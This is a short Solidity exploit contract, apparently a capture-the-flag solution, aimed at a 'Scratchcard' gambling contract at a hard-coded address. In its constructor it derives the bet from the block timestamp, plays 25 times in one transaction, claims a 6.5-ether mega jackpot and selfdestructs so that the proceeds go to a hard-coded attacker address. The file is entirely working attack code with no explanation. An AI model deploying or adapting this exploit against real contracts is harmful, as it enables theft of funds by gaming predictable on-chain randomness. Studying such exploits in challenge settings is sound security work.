pragma solidity 0.4.24;
//Challenge Address 0x505d51adcccb62cd33579c1ea7b94a717f7ae06e
//Attacker Address 0x43065950E0185BD74361D8580Daaa5BFF806aaDE
import "./Attack.sol";

contract exp{

    address target = 0x505d51adcccb62cd33579c1ea7b94a717f7ae06e;
    Scratchcard A = Scratchcard(target);
    uint time;
    constructor()payable{
      uint val = (now%10**8)*10**10;
        for (uint i=0; i<25; i++) {
            A.play.value(val)();
        }
        A.collectMegaJackpot(6.5 ether);
        selfdestruct(0x43065950E0185BD74361D8580Daaa5BFF806aaDE);
    }
    function() payable{}

}